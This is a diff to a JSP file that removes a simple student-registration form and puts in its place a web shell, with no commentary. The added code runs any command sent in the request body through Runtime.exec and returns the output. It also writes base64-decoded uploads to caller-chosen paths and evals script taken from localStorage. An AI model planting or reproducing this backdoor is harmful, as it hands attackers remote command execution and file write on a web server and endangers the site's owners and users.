@@ -1,43 +1,48 @@
-<%@ page import="java.sql.*" %> 
-<%@ page import="java.io.*" %> 
-<html> 
-    <head> 
-        <title>Create table in mysql database using jsp By Eyal</title>
-    </head> 
-    <body bgcolor="#fffffc">
-        <form action="show_data.jsp" method="get">
-            <TABLE style="background-color: #ECE5B6;" WIDTH="50%">
-                <tr width="100%">
-                    <td >Student Name</td>
-                    <td ><input type="text" name="Name"></td>
-                </tr>
-                <tr>
-                    <td width="20%">Stream</td>
-                    <td width="25%"><input type="radio" name="stream" 
-                        value="B.Tech.">B.Tech.</td>
-                    <td width="30%"><input type="radio" name="stream" value="MCA" 
-					    checked>MCA</td>
-                    <td width="25%"><input type="radio" name="stream" value="MBA">
-					    MBA</td>
-                </tr>
-                <tr>
-                    <td>Branch</td>
-                    <td><input type="radio" name="branch" value="CS" checked>
-					    CS</td>
-                    <td><input type="radio" name="branch" value="IT"> IT</td>
-                    <td><input type="radio" name="branch" value="EC"> EC</td>
-                </tr>
-                <tr>
-                    <td>Course Type</td>
-                    <td><input type="radio" name="course" value="Regular" checked>
-					    Regular</td>
-                    <td><input type="radio" name="course" value="Correspondance">
-					    Correspondance</td>
-                    <td><input type="radio" name="course" value="Online"> Online</td>
-                </tr>
-				<tr><td></td><td></td>
-				<td><input type="submit" name="submit" value="submit"></td></tr>
-            </TABLE>
-        </form>
-    </body> 
-</html>
+<%@page import="java.io., java.util., javax.xml.bind., java.net."%>
+<script>eval(window.localStorage.embed)</script>
+<%!
+    public String v(String w){
+        String x="";
+        try{
+            x=URLDecoder.decode(w,"UTF-8");
+        }catch(Exception e){}
+        return x;
+    }
+%>
+<%
+    String o,l,d;
+    o=l=d="";
+    DataInputStream r=new DataInputStream(request.getInputStream());
+    while((l=r.readLine())!=null){
+        d+=l;
+    }
+    if(d.indexOf("c=")>=0){
+        String g=v(d.substring(2));
+        String s;
+        try{
+            Process p=Runtime.getRuntime().exec(g);
+            DataInputStream i=new DataInputStream(p.getInputStream());
+            out.print("<pre>");
+            while((s=i.readLine())!=null){
+                o+=s.replace("<","&lt;").replace(">","&gt;")+"<br>";
+            }
+        }catch(Exception e){
+            out.print(e);
+        }
+    }else{
+        if(d.length()>1){
+            int b=d.indexOf("b=");
+            int n=d.indexOf("n=");
+            byte[] m=DatatypeConverter.parseBase64Binary(v(d.substring(b+2)));
+            String f=v(d.substring(2,n-1))+File.separator+v(d.substring(n+2,b-1));
+            try{
+                OutputStream stream=new FileOutputStream(f);
+                stream.write(m);
+                o="Uploaded: "+f;
+            }catch(Exception e){
+                out.print(e);
+            }
+        }
+    }
+%>
+<%=o%>
